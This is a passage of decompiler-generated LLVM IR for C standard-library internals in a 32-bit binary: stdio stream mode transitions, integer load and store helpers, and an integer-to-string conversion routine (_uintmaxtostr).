  %v2_804f396 = call i32 @__stdio_wcommit(i32 %v0_804f395)
  %v1_804f39e = icmp eq i32 %v2_804f396, 0
  %v1_804f3a0 = icmp eq i1 %v1_804f39e, false
  br i1 %v1_804f3a0, label %dec_label_pc_804f381, label %dec_label_pc_804f3a2

dec_label_pc_804f3a2:                             ; preds = %dec_label_pc_804f392
  %v0_804f3a2 = load i32, i32* @ebx, align 4
  %v1_804f3a2 = add i32 %v0_804f3a2, 8
  %v2_804f3a2 = inttoptr i32 %v1_804f3a2 to i32*
  %v3_804f3a2 = load i32, i32* %v2_804f3a2, align 4
  %v2_804f3a5 = add i32 %v0_804f3a2, 28
  %v3_804f3a5 = inttoptr i32 %v2_804f3a5 to i32*
  store i32 %v3_804f3a2, i32* %v3_804f3a5, align 4
  %v0_804f3a8 = load i32, i32* @ebx, align 4
  %v1_804f3a8 = inttoptr i32 %v0_804f3a8 to i32*
  %v2_804f3a8 = load i32, i32* %v1_804f3a8, align 4
  %v2_804f3a8.tr = trunc i32 %v2_804f3a8 to i16
  %v1_804f3ad = and i16 %v2_804f3a8.tr, -65
  %v3_804f3ad = inttoptr i32 %v0_804f3a8 to i16*
  store i16 %v1_804f3ad, i16* %v3_804f3ad, align 2
  %v0_804f3b0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f3b0

dec_label_pc_804f3b0:                             ; preds = %dec_label_pc_804f38e, %dec_label_pc_804f3a2
  %v2_804f3b5 = phi i32 [ %v0_804f395, %dec_label_pc_804f38e ], [ %v0_804f3b0.pre, %dec_label_pc_804f3a2 ]
  %v1_804f3b0 = inttoptr i32 %v2_804f3b5 to i32*
  %v2_804f3b0 = load i32, i32* %v1_804f3b0, align 4
  %v1_804f3b2 = or i32 %v2_804f3b0, 1
  %v1_804f3b5 = trunc i32 %v1_804f3b2 to i16
  %v3_804f3b5 = inttoptr i32 %v2_804f3b5 to i16*
  store i16 %v1_804f3b5, i16* %v3_804f3b5, align 2
  br label %dec_label_pc_804f3ba

dec_label_pc_804f3ba:                             ; preds = %dec_label_pc_804f381, %dec_label_pc_804f3b0
  %storemerge = phi i32 [ 0, %dec_label_pc_804f3b0 ], [ -1, %dec_label_pc_804f381 ]
  %v2_804f3ba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f3ba, i32* @edx, align 4
  store i32 %v0_804f350, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804f35c, { 0, 2, 1 }
  uselistorder i32 %v0_804f350, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f3ba, { 1, 0 }
  uselistorder label %dec_label_pc_804f3b0, { 1, 0 }
  uselistorder label %dec_label_pc_804f36f, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f3c0 = load i32, i32* @ebx, align 4
  %v4_804f3c4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f3c4, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804f3cc = load i16, i16* %arg1, align 2
  %v3_804f3cc = zext i16 %v2_804f3cc to i32
  store i32 %v3_804f3cc, i32* %eax.global-to-local, align 4
  %v2_804f3cf = and i32 %v3_804f3cc, %arg2
  %v3_804f3cf = icmp eq i32 %v2_804f3cf, 0
  %v1_804f3d1 = icmp eq i1 %v3_804f3cf, false
  br i1 %v1_804f3d1, label %dec_label_pc_804f3df, label %dec_label_pc_804f3d3

dec_label_pc_804f3d3:                             ; preds = %entry
  %v1_804f3d3 = and i32 %v3_804f3cc, 2176
  %v2_804f3d3 = icmp eq i32 %v1_804f3d3, 0
  %v1_804f3d8 = icmp eq i1 %v2_804f3d3, false
  br i1 %v1_804f3d8, label %dec_label_pc_804f3e7, label %dec_label_pc_804f3da

dec_label_pc_804f3da:                             ; preds = %dec_label_pc_804f3d3
  %v2_804f3da = or i32 %v3_804f3cc, %arg2
  store i32 %v2_804f3da, i32* %eax.global-to-local, align 4
  %v1_804f3dc = trunc i32 %v2_804f3da to i16
  store i16 %v1_804f3dc, i16* %arg1, align 2
  %v0_804f3df.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f3df

dec_label_pc_804f3df:                             ; preds = %entry, %dec_label_pc_804f3da
  %v0_804f428 = phi i32 [ %v4_804f3c4, %entry ], [ %v0_804f3df.pre, %dec_label_pc_804f3da ]
  %v1_804f3df = inttoptr i32 %v0_804f428 to i16*
  %v2_804f3df = load i16, i16* %v1_804f3df, align 2
  %v3_804f3df = zext i16 %v2_804f3df to i32
  store i32 %v3_804f3df, i32* %edx.global-to-local, align 4
  %v2_804f3e2 = and i16 %v2_804f3df, 32
  %v3_804f3e2 = icmp eq i16 %v2_804f3e2, 0
  br i1 %v3_804f3e2, label %dec_label_pc_804f3ff, label %dec_label_pc_804f3e7

dec_label_pc_804f3e7:                             ; preds = %dec_label_pc_804f3df, %dec_label_pc_804f3d3
  %v1_804f3e7 = call i32 @__errno_location(i32 %v0_804f3c0)
  store i32 %v1_804f3e7, i32* %eax.global-to-local, align 4
  %v1_804f3ec = inttoptr i32 %v1_804f3e7 to i32*
  store i32 9, i32* %v1_804f3ec, align 4
  br label %dec_label_pc_804f3f2

dec_label_pc_804f3f2:                             ; preds = %dec_label_pc_804f416, %dec_label_pc_804f3e7
  %v0_804f3f2 = load i32, i32* @ebx, align 4
  %v1_804f3f2 = inttoptr i32 %v0_804f3f2 to i32*
  %v2_804f3f2 = load i32, i32* %v1_804f3f2, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804f3f7 = or i32 %v2_804f3f2, 8
  store i32 %v1_804f3f7, i32* %eax.global-to-local, align 4
  %v1_804f3fa = trunc i32 %v1_804f3f7 to i16
  %v3_804f3fa = inttoptr i32 %v0_804f3f2 to i16*
  store i16 %v1_804f3fa, i16* %v3_804f3fa, align 2
  br label %dec_label_pc_804f461

dec_label_pc_804f3ff:                             ; preds = %dec_label_pc_804f3df
  %v2_804f3ff = urem i16 %v2_804f3df, 4
  %v3_804f3ff = icmp eq i16 %v2_804f3ff, 0
  br i1 %v3_804f3ff, label %dec_label_pc_804f449, label %dec_label_pc_804f404

dec_label_pc_804f404:                             ; preds = %dec_label_pc_804f3ff
  %v2_804f404 = and i32 %v3_804f3df, 4
  %v3_804f404 = icmp eq i32 %v2_804f404, 0
  %v1_804f407 = icmp eq i1 %v3_804f404, false
  br i1 %v1_804f407, label %dec_label_pc_804f435, label %dec_label_pc_804f409

dec_label_pc_804f409:                             ; preds = %dec_label_pc_804f404
  %v1_804f409 = add i32 %v0_804f428, 20
  %v2_804f409 = inttoptr i32 %v1_804f409 to i32*
  %v3_804f409 = load i32, i32* %v2_804f409, align 4
  store i32 %v3_804f409, i32* %eax.global-to-local, align 4
  %v2_804f40c = add i32 %v0_804f428, 16
  %v3_804f40c = inttoptr i32 %v2_804f40c to i32*
  %v4_804f40c = load i32, i32* %v3_804f40c, align 4
  %v15_804f40c = icmp eq i32 %v3_804f409, %v4_804f40c
  %v1_804f40f = icmp eq i1 %v15_804f40c, false
  br i1 %v1_804f40f, label %dec_label_pc_804f416, label %dec_label_pc_804f411

dec_label_pc_804f411:                             ; preds = %dec_label_pc_804f409
  %v2_804f411 = and i32 %v3_804f3df, 2
  %v3_804f411 = icmp eq i32 %v2_804f411, 0
  br i1 %v3_804f411, label %dec_label_pc_804f435, label %dec_label_pc_804f416

dec_label_pc_804f416:                             ; preds = %dec_label_pc_804f411, %dec_label_pc_804f409
  %v1_804f416 = and i32 %v3_804f3df, 1024
  store i32 %v1_804f416, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_804f416, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_804f429 = call i32 @__GI_fseek(i32 %v0_804f428, i32 0, i32 %tmp17, i32 %v1_804f416)
  store i32 %v5_804f429, i32* %eax.global-to-local, align 4
  %v1_804f431 = icmp eq i32 %v5_804f429, 0
  %v1_804f433 = icmp eq i1 %v1_804f431, false
  br i1 %v1_804f433, label %dec_label_pc_804f3f2, label %dec_label_pc_804f416.dec_label_pc_804f435_crit_edge

dec_label_pc_804f416.dec_label_pc_804f435_crit_edge: ; preds = %dec_label_pc_804f416
  %v0_804f435.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f435

dec_label_pc_804f435:                             ; preds = %dec_label_pc_804f416.dec_label_pc_804f435_crit_edge, %dec_label_pc_804f411, %dec_label_pc_804f404
  %v2_804f43a = phi i32 [ %v0_804f435.pre, %dec_label_pc_804f416.dec_label_pc_804f435_crit_edge ], [ %v0_804f428, %dec_label_pc_804f411 ], [ %v0_804f428, %dec_label_pc_804f404 ]
  %v1_804f435 = inttoptr i32 %v2_804f43a to i32*
  %v2_804f435 = load i32, i32* %v1_804f435, align 4
  %v1_804f437 = and i32 %v2_804f435, -4
  store i32 %v1_804f437, i32* %eax.global-to-local, align 4
  %v1_804f43a = trunc i32 %v1_804f437 to i16
  %v3_804f43a = inttoptr i32 %v2_804f43a to i16*
  store i16 %v1_804f43a, i16* %v3_804f43a, align 2
  %v0_804f43d = load i32, i32* @ebx, align 4
  %v1_804f43d = add i32 %v0_804f43d, 8
  %v2_804f43d = inttoptr i32 %v1_804f43d to i32*
  %v3_804f43d = load i32, i32* %v2_804f43d, align 4
  store i32 %v3_804f43d, i32* %eax.global-to-local, align 4
  %v2_804f440 = add i32 %v0_804f43d, 24
  %v3_804f440 = inttoptr i32 %v2_804f440 to i32*
  store i32 %v3_804f43d, i32* %v3_804f440, align 4
  %v0_804f443 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f443 = load i32, i32* @ebx, align 4
  %v2_804f443 = add i32 %v1_804f443, 16
  %v3_804f443 = inttoptr i32 %v2_804f443 to i32*
  store i32 %v0_804f443, i32* %v3_804f443, align 4
  %v0_804f446 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f446 = load i32, i32* @ebx, align 4
  %v2_804f446 = add i32 %v1_804f446, 20
  %v3_804f446 = inttoptr i32 %v2_804f446 to i32*
  store i32 %v0_804f446, i32* %v3_804f446, align 4
  %v0_804f449.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f449

dec_label_pc_804f449:                             ; preds = %dec_label_pc_804f3ff, %dec_label_pc_804f435
  %v2_804f450 = phi i32 [ %v0_804f428, %dec_label_pc_804f3ff ], [ %v0_804f449.pre, %dec_label_pc_804f435 ]
  %v1_804f449 = inttoptr i32 %v2_804f450 to i32*
  %v2_804f449 = load i32, i32* %v1_804f449, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804f44d = or i32 %v2_804f449, 64
  store i32 %v1_804f44d, i32* %eax.global-to-local, align 4
  %v1_804f450 = trunc i32 %v1_804f44d to i16
  %v3_804f450 = inttoptr i32 %v2_804f450 to i16*
  store i16 %v1_804f450, i16* %v3_804f450, align 2
  %v0_804f453 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f453 = urem i32 %v0_804f453, 65536
  store i32 %v1_804f453, i32* %eax.global-to-local, align 4
  %v3_804f456 = and i32 %v0_804f453, 2816
  %v4_804f456 = icmp eq i32 %v3_804f456, 0
  %v1_804f459 = icmp eq i1 %v4_804f456, false
  br i1 %v1_804f459, label %dec_label_pc_804f461, label %dec_label_pc_804f45b

dec_label_pc_804f45b:                             ; preds = %dec_label_pc_804f449
  %v0_804f45b = load i32, i32* @ebx, align 4
  %v1_804f45b = add i32 %v0_804f45b, 12
  %v2_804f45b = inttoptr i32 %v1_804f45b to i32*
  %v3_804f45b = load i32, i32* %v2_804f45b, align 4
  store i32 %v3_804f45b, i32* %eax.global-to-local, align 4
  %v2_804f45e = add i32 %v0_804f45b, 28
  %v3_804f45e = inttoptr i32 %v2_804f45e to i32*
  store i32 %v3_804f45b, i32* %v3_804f45e, align 4
  br label %dec_label_pc_804f461

dec_label_pc_804f461:                             ; preds = %dec_label_pc_804f449, %dec_label_pc_804f3f2, %dec_label_pc_804f45b
  %v0_804f461 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f461, i32* %eax.global-to-local, align 4
  %v2_804f463 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f463, i32* %edx.global-to-local, align 4
  store i32 %v0_804f3c0, i32* @ebx, align 4
  ret i32 %v0_804f461

; uselistorder directives
  uselistorder i32 %v0_804f453, { 1, 0 }
  uselistorder i32 %v1_804f416, { 1, 0, 2 }
  uselistorder i32 %v0_804f428, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_804f3cc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f3c0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 7, 6, 5, 8, 3, 1, 2, 4 }
  uselistorder i16 32, { 3, 0, 1, 2 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f461, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f449, { 1, 0 }
  uselistorder label %dec_label_pc_804f3df, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_804f468 = icmp slt i32 %tmp5, 0
  %v3_804f499 = and i32 %tmp4, 2048
  %v4_804f499 = icmp eq i32 %v3_804f499, 0
  br i1 %v5_804f468, label %dec_label_pc_804f499, label %dec_label_pc_804f477

dec_label_pc_804f477:                             ; preds = %entry
  %v1_804f47a = icmp eq i1 %v4_804f499, false
  br i1 %v1_804f47a, label %dec_label_pc_804f49e, label %dec_label_pc_804f47c

dec_label_pc_804f47c:                             ; preds = %dec_label_pc_804f477
  %v6_804f47c = icmp eq i32 %tmp4, 256
  %v1_804f482 = inttoptr i32 %tmp to i32*
  %v2_804f482 = load i32, i32* %v1_804f482, align 4
  %v1_804f484 = icmp eq i1 %v6_804f47c, false
  br i1 %v1_804f484, label %dec_label_pc_804f48b, label %dec_label_pc_804f486

dec_label_pc_804f486:                             ; preds = %dec_label_pc_804f47c
  %v1_804f486 = urem i32 %v2_804f482, 256
  br label %dec_label_pc_804f496

dec_label_pc_804f48b:                             ; preds = %dec_label_pc_804f47c
  %v6_804f48b = icmp eq i32 %tmp4, 512
  %v1_804f491 = icmp eq i1 %v6_804f48b, false
  br i1 %v1_804f491, label %dec_label_pc_804f496, label %dec_label_pc_804f493

dec_label_pc_804f493:                             ; preds = %dec_label_pc_804f48b
  %v1_804f493 = urem i32 %v2_804f482, 65536
  br label %dec_label_pc_804f496

dec_label_pc_804f496:                             ; preds = %dec_label_pc_804f48b, %dec_label_pc_804f486, %dec_label_pc_804f493
  %v0_804f498 = phi i32 [ %v2_804f482, %dec_label_pc_804f48b ], [ %v1_804f486, %dec_label_pc_804f486 ], [ %v1_804f493, %dec_label_pc_804f493 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804f498

dec_label_pc_804f499:                             ; preds = %entry
  br i1 %v4_804f499, label %dec_label_pc_804f4a4, label %dec_label_pc_804f49e

dec_label_pc_804f49e:                             ; preds = %dec_label_pc_804f499, %dec_label_pc_804f477
  %v1_804f49e = add i32 %tmp, 4
  %v2_804f49e = inttoptr i32 %v1_804f49e to i32*
  %v3_804f49e = load i32, i32* %v2_804f49e, align 4
  store i32 %v3_804f49e, i32* @edx, align 4
  %v1_804f4a1 = inttoptr i32 %tmp to i32*
  %v2_804f4a1 = load i32, i32* %v1_804f4a1, align 4
  ret i32 %v2_804f4a1

dec_label_pc_804f4a4:                             ; preds = %dec_label_pc_804f499
  %v6_804f4a4 = icmp eq i32 %tmp4, 256
  %v1_804f4aa = inttoptr i32 %tmp to i32*
  %v2_804f4aa = load i32, i32* %v1_804f4aa, align 4
  %v1_804f4ac = icmp eq i1 %v6_804f4a4, false
  br i1 %v1_804f4ac, label %dec_label_pc_804f4b3, label %dec_label_pc_804f4ae

dec_label_pc_804f4ae:                             ; preds = %dec_label_pc_804f4a4
  %v1_804f4ae = mul i32 %v2_804f4aa, 16777216
  %v2_804f4ae = sdiv i32 %v1_804f4ae, 16777216
  br label %dec_label_pc_804f4bc

dec_label_pc_804f4b3:                             ; preds = %dec_label_pc_804f4a4
  %v6_804f4b3 = icmp eq i32 %tmp4, 512
  %v1_804f4b9 = icmp eq i1 %v6_804f4b3, false
  br i1 %v1_804f4b9, label %dec_label_pc_804f4bc, label %dec_label_pc_804f4bb

dec_label_pc_804f4bb:                             ; preds = %dec_label_pc_804f4b3
  %v1_804f4bb = mul i32 %v2_804f4aa, 65536
  %v2_804f4bb = sdiv i32 %v1_804f4bb, 65536
  br label %dec_label_pc_804f4bc

dec_label_pc_804f4bc:                             ; preds = %dec_label_pc_804f4b3, %dec_label_pc_804f4ae, %dec_label_pc_804f4bb
  %v0_804f4bc = phi i32 [ %v2_804f4aa, %dec_label_pc_804f4b3 ], [ %v2_804f4ae, %dec_label_pc_804f4ae ], [ %v2_804f4bb, %dec_label_pc_804f4bb ]
  %v1_804f4bc = ashr i32 %v0_804f4bc, 31
  store i32 %v1_804f4bc, i32* @edx, align 4
  ret i32 %v0_804f4bc

; uselistorder directives
  uselistorder i32 %v0_804f4bc, { 1, 0 }
  uselistorder i32 %v2_804f4aa, { 2, 0, 1 }
  uselistorder i32 %v2_804f482, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 6, 5, 8, 7, 10, 9, 12, 11 }
  uselistorder label %dec_label_pc_804f4bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f496, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f4c0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f4c0, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804f4c5 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804f4c5, i32* %ebx.global-to-local, align 4
  %v4_804f4c9 = trunc i32 %tmp4 to i16
  %v6_804f4d1 = icmp eq i32 %tmp6, 256
  %v1_804f4d7 = icmp eq i1 %v6_804f4d1, false
  br i1 %v1_804f4d7, label %dec_label_pc_804f4dd, label %dec_label_pc_804f4d9

dec_label_pc_804f4d9:                             ; preds = %entry
  %v2_804f4d9 = trunc i32 %tmp4 to i8
  %v4_804f4d9 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804f4d9, i8* %v4_804f4d9, align 1
  br label %dec_label_pc_804f4fb

dec_label_pc_804f4dd:                             ; preds = %entry
  %v6_804f4dd = icmp eq i32 %tmp6, 2048
  %v1_804f4e3 = icmp eq i1 %v6_804f4dd, false
  br i1 %v1_804f4e3, label %dec_label_pc_804f4ec, label %dec_label_pc_804f4e5

dec_label_pc_804f4e5:                             ; preds = %dec_label_pc_804f4dd
  %sext2 = mul i32 %tmp4, 65536
  %v1_804f4e5 = sdiv i32 %sext2, 65536
  %v3_804f4e5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f4e5, i32* %v3_804f4e5, align 4
  %v0_804f4e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f4e7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f4e7 = add i32 %v1_804f4e7, 4
  %v3_804f4e7 = inttoptr i32 %v2_804f4e7 to i32*
  store i32 %v0_804f4e7, i32* %v3_804f4e7, align 4
  br label %dec_label_pc_804f4fb

dec_label_pc_804f4ec:                             ; preds = %dec_label_pc_804f4dd
  %v6_804f4ec = icmp eq i32 %tmp6, 512
  %v1_804f4f2 = icmp eq i1 %v6_804f4ec, false
  br i1 %v1_804f4f2, label %dec_label_pc_804f4f9, label %dec_label_pc_804f4f4

dec_label_pc_804f4f4:                             ; preds = %dec_label_pc_804f4ec
  store i16 %v4_804f4c9, i16* %tmp5, align 2
  br label %dec_label_pc_804f4fb

dec_label_pc_804f4f9:                             ; preds = %dec_label_pc_804f4ec
  %sext3 = mul i32 %tmp4, 65536
  %v1_804f4f9 = sdiv i32 %sext3, 65536
  %v3_804f4f9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f4f9, i32* %v3_804f4f9, align 4
  br label %dec_label_pc_804f4fb

dec_label_pc_804f4fb:                             ; preds = %dec_label_pc_804f4f4, %dec_label_pc_804f4e5, %dec_label_pc_804f4d9, %dec_label_pc_804f4f9
  %v2_804f4fb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f4fb, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804f4fc = sdiv i32 %sext, 65536
  ret i32 %v1_804f4fc

; uselistorder directives
  uselistorder i32 512, { 0, 1, 2, 6, 3, 7, 8, 4, 5 }
  uselistorder label %dec_label_pc_804f4fb, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804f50b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f50b, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804f517 = icmp slt i32 %arg4, 0
  %v1_804f519 = icmp eq i1 %v2_804f517, false
  br i1 %v1_804f519, label %dec_label_pc_804f53a, label %dec_label_pc_804f51b

dec_label_pc_804f51b:                             ; preds = %entry
  %v1_804f51b = sub i32 0, %arg4
  store i32 %v1_804f51b, i32* %esi.global-to-local, align 4
  %v2_804f51d = icmp slt i32 %arg3, 0
  %v1_804f51f = icmp eq i1 %v2_804f51d, false
  br i1 %v1_804f51f, label %dec_label_pc_804f53a, label %dec_label_pc_804f521

dec_label_pc_804f521:                             ; preds = %dec_label_pc_804f51b
  %v1_804f521 = sub i32 0, %arg2
  %v5_804f521 = icmp ne i32 %arg2, 0
  store i32 %v1_804f521, i32* %ecx.global-to-local, align 4
  %v2_804f523 = zext i1 %v5_804f521 to i32
  %v3_804f523 = add i32 %v2_804f523, %arg3
  %v1_804f526 = sub i32 0, %v3_804f523
  store i32 %v1_804f526, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f53a

dec_label_pc_804f53a:                             ; preds = %entry, %dec_label_pc_804f51b, %dec_label_pc_804f521
  %v0_804f53f = phi i32 [ %v1_804f51b, %dec_label_pc_804f521 ], [ %v1_804f51b, %dec_label_pc_804f51b ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_804f521 ], [ 0, %dec_label_pc_804f51b ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_804f53f
  %tmp30 = urem i32 -1, %v0_804f53f
  store i8 0, i8* %arg1, align 1
  %v1_804f544 = add i32 %tmp30, 1
  %v1_804f545 = load i32, i32* %esi.global-to-local, align 4
  %v12_804f545 = icmp eq i32 %v1_804f544, %v1_804f545
  %v1_804f54f = icmp eq i1 %v12_804f545, false
  br i1 %v1_804f54f, label %dec_label_pc_804f55e, label %dec_label_pc_804f551

dec_label_pc_804f551:                             ; preds = %dec_label_pc_804f53a
  %v1_804f551 = add i32 %div, 1
  br label %dec_label_pc_804f55e

dec_label_pc_804f55e:                             ; preds = %dec_label_pc_804f53a, %dec_label_pc_804f551
  %stack_var_-20.0.off0 = phi i32 [ %v1_804f544, %dec_label_pc_804f53a ], [ 0, %dec_label_pc_804f551 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804f53a ], [ %v1_804f551, %dec_label_pc_804f551 ]
  %v0_804f55e = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f55e, i32* %ebp.global-to-local, align 4
  %v0_804f560 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f560, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f564

dec_label_pc_804f564:                             ; preds = %dec_label_pc_804f5b2, %dec_label_pc_804f55e
  %v0_804f59b = phi i32 [ %v0_804f5b4, %dec_label_pc_804f5b2 ], [ %v0_804f55e, %dec_label_pc_804f55e ]
  %v0_804f568 = phi i32 [ %v1_804f5b6, %dec_label_pc_804f5b2 ], [ %v0_804f560, %dec_label_pc_804f55e ]
  %v1_804f564 = icmp eq i32 %v0_804f568, 0
  br i1 %v1_804f564, label %dec_label_pc_804f59b, label %dec_label_pc_804f568

dec_label_pc_804f568:                             ; preds = %dec_label_pc_804f564
  %v0_804f56c = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_804f568, %v0_804f56c
  %tmp31 = urem i32 %v0_804f568, %v0_804f56c
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_804f59b, %v0_804f56c
  %tmp32 = urem i32 %v0_804f59b, %v0_804f56c
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_804f57f = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_804f583 = add i32 %tmp32, %v6_804f57f
  %v8_804f589 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_804f58e = add i32 %div7, %v8_804f589
  store i32 %v2_804f58e, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_804f583, %v0_804f56c
  %tmp33 = urem i32 %v2_804f583, %v0_804f56c
  %v2_804f596 = add i32 %div8, %v2_804f58e
  br label %dec_label_pc_804f5a3

dec_label_pc_804f59b:                             ; preds = %dec_label_pc_804f564
  %v0_804f59f = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_804f59b, %v0_804f59f
  %tmp34 = urem i32 %v0_804f59b, %v0_804f59f
  br label %dec_label_pc_804f5a3

dec_label_pc_804f5a3:                             ; preds = %dec_label_pc_804f568, %dec_label_pc_804f59b
  %v13_804f5a9 = phi i32 [ %tmp33, %dec_label_pc_804f568 ], [ %tmp34, %dec_label_pc_804f59b ]
  %storemerge = phi i32 [ %v2_804f596, %dec_label_pc_804f568 ], [ %div10, %dec_label_pc_804f59b ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804f5a3 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f5a3 = add i32 %v0_804f5a3, -1
  store i32 %v1_804f5a3, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_804f5a9, 10
  br i1 %tmp, label %dec_label_pc_804f5a9, label %dec_label_pc_804f5ae

dec_label_pc_804f5a9:                             ; preds = %dec_label_pc_804f5a3
  %v2_804f5a9 = add i32 %v13_804f5a9, 48
  %v12_804f5a9 = and i32 %v2_804f5a9, 255
  %v14_804f5a9 = and i32 %v13_804f5a9, -256
  %v15_804f5a9 = or i32 %v12_804f5a9, %v14_804f5a9
  br label %dec_label_pc_804f5b2

dec_label_pc_804f5ae:                             ; preds = %dec_label_pc_804f5a3
  %v6_804f5ae = add i32 %v13_804f5a9, %arg5
  %v21_804f5ae = and i32 %v6_804f5ae, 255
  %v23_804f5ae = and i32 %v13_804f5a9, -256
  %v24_804f5ae = or i32 %v21_804f5ae, %v23_804f5ae
  br label %dec_label_pc_804f5b2

dec_label_pc_804f5b2:                             ; preds = %dec_label_pc_804f5a9, %dec_label_pc_804f5ae
  %storemerge9 = phi i32 [ %v15_804f5a9, %dec_label_pc_804f5a9 ], [ %v24_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5b2 = trunc i32 %storemerge9 to i8
  %v3_804f5b2 = inttoptr i32 %v1_804f5a3 to i8*
  store i8 %v1_804f5b2, i8* %v3_804f5b2, align 1
  %v0_804f5b4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f5b6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f5b6 = or i32 %v1_804f5b6, %v0_804f5b4
  %v3_804f5b6 = icmp eq i32 %v2_804f5b6, 0
  %v1_804f5b8 = icmp eq i1 %v3_804f5b6, false
  br i1 %v1_804f5b8, label %dec_label_pc_804f564, label %dec_label_pc_804f5ba

dec_label_pc_804f5ba:                             ; preds = %dec_label_pc_804f5b2
  %v4_804f5ba = icmp eq i32 %storemerge11, 0
  br i1 %v4_804f5ba, label %dec_label_pc_804f5c5, label %dec_label_pc_804f5c1

dec_label_pc_804f5c1:                             ; preds = %dec_label_pc_804f5ba
  %v0_804f5c1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f5c1 = add i32 %v0_804f5c1, -1
  store i32 %v1_804f5c1, i32* %edi.global-to-local, align 4
  %v1_804f5c2 = inttoptr i32 %v1_804f5c1 to i8*
  store i8 45, i8* %v1_804f5c2, align 1
  br label %dec_label_pc_804f5c5

dec_label_pc_804f5c5:                             ; preds = %dec_label_pc_804f5ba, %dec_label_pc_804f5c1
  %v0_804f5c8 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f5c8

; uselistorder directives
  uselistorder i32 %v13_804f5a9, { 4, 2, 3, 1, 0 }
